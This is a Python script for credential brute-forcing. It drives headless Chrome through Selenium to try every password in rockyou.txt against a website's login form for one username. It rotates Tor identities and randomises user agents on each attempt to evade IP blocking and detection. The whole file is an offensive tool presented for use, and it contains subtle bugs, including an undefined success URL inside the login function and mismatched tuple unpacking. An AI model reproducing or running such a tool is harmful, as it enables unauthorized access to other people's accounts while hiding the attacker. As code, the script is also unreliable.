import random
import os
import time
from threading import Thread
from queue import Queue
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from stem import Signal
from stem.control import Controller

# Function to rotate Tor IP
def rotate_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password="your_password")  # Provide your Tor password
        controller.signal(Signal.NEWNYM)

# Function to perform login attempt
def attempt_login(username, password, url, username_selector, password_selector, login_button_selector, success_queue, failure_queue):
    # Create a new Tor identity
    rotate_ip()

    # Generate random user-agent
    user_agent = UserAgent().random

    # Configure Selenium options
    options = Options()
    options.add_argument("--proxy-server=socks5://127.0.0.1:9050")  # Use Tor SOCKS proxy
    options.add_argument("--headless")  # Run Chrome in headless mode
    options.add_argument(f"user-agent={user_agent}")

    # Initialize WebDriver
    driver = webdriver.Chrome(options=options)

    try:
        # Open the website
        driver.get(url)
        time.sleep(random.uniform(1, 3))  # Random delay between 1 to 3 seconds

        # Find and fill username and password fields
        driver.find_element_by_css_selector(username_selector).send_keys(username)
        driver.find_element_by_css_selector(password_selector).send_keys(password)

        # Click on the login button
        driver.find_element_by_css_selector(login_button_selector).click()

        # Add logic to check for successful login
        if driver.current_url == success_url:
            success_queue.put((username, password))
        else:
            failure_queue.put((username, password))

    except Exception as e:
        failure_queue.put((username, password, str(e)))

    finally:
        # Close the WebDriver session
        driver.quit()

# Main function
def main():
    # Get user input for URL (optional)
    url = input("Enter the URL (leave blank for default): ").strip() or "https://example.com"

    # Set default values for username selector and login button selector
    username_selector = "input[name='username']"
    password_selector = "input[name='password']"
    login_button_selector = "button[type='submit']"
    success_url = "https://example.com/success"  # Change this to the actual success URL

    # Get username from user input
    username = input("Enter the username: ")

    # Read password list from file
    password_list_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "rockyou.txt")
    with open(password_list_path, "r", encoding="utf-8", errors="ignore") as file:
        password_list = file.read().splitlines()

    # Initialize queues for successful and failed attempts
    success_queue = Queue()
    failure_queue = Queue()

    # Create and start threads for login attempts
    threads = []
    for password in password_list:
        thread = Thread(target=attempt_login, args=(username, password, url, username_selector, password_selector, login_button_selector, success_queue, failure_queue))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Process results from queues
    while not success_queue.empty():
        username, password = success_queue.get()
        print(f"Successful login: Username - {username}, Password - {password}")

    while not failure_queue.empty():
        username, password, error_message = failure_queue.get()
        print(f"Failed login: Username - {username}, Password - {password}, Error - {error_message}")

# Entry point of the script
if __name__ == "__main__":
    main()
